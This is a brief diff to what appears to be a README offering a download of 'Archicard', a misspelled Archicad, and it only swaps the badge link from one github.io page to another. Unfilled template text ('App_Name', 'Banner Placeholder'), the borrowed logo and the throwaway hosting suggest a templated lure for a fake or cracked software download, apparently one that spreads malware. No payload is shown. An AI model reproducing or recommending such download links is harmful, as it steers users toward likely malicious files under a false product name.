@@ -4,7 +4,7 @@
 
 ![Banner Placeholder](https://upload.wikimedia.org/wikipedia/commons/e/e6/Archicad-logo-1.png)
 
-[![Get Archicard](https://img.shields.io/badge/Download_App_Name-Now-0a5d8d?style=for-the-badge&logo=github)](https://seezmelilwj.github.io/.github/archicard)
+[![Get Archicard](https://img.shields.io/badge/Download_App_Name-Now-0a5d8d?style=for-the-badge&logo=github)](https://asrafali6140.github.io/.github/archicard)
 
 ---
 
